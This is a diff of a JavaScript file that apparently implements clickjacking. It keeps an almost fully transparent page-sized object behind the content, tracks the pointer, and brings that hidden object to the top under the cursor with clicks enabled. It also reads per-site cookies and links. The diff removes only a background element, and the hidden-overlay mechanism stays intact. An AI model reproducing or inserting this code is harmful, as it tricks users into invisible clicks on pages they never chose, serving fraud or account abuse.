@@ -3,8 +3,8 @@ let siteSelected = [{link: null, cookie: null, margin: 0}];
 let monitorTracker = null;
 let canTrack = 0;
 let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
-let htmlCode = '<div id="_gcli_backgrd'+ uniqueID +'"></div> <div id="_gcli_div'+ uniqueID +'"><object id="_gcli_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
-let cssCode = '<style>#_gcli_backgrd'+ uniqueID +'{position:fixed;z-index:-999989;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;background:#FFF;}#_gcli_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
+let htmlCode = '<div id="_gcli_div'+ uniqueID +'"><object id="_gcli_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
+let cssCode = '<style>#_gcli_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 let pointerTracker = function(e){
     let out = {x:0, y:0};
     if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
@@ -54,8 +54,6 @@ function getCookie(strCookie) {
 }
 function minimizeDiv() {
     canTrack = 0;
-    //#_gcli_backgrd
-    $("#_gcli_backgrd" + uniqueID).css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999989").css("position", "fixed");
     $("#_gcli_div" + uniqueID).css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed");
     $("#_gcli_obj" + uniqueID).css("top", "").css("left", "").css("pointer-events", "none");
 }
@@ -84,7 +82,6 @@ function showDiv() {
 
     $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("left", "-70px").css("pointer-events", "");
     $("#_gcli_div" + uniqueID).css("width", "730px").css("height", siteSelected.margin + 170 + "px").css("z-index", "999999").css("position", "absolute");
-    $("#_gcli_backgrd" + uniqueID).css("z-index", "999989").css("position", "fixed");
 }
 function showOrMinimize() {
     document.getElementById('_gcli_obj' + uniqueID).onload=function(){
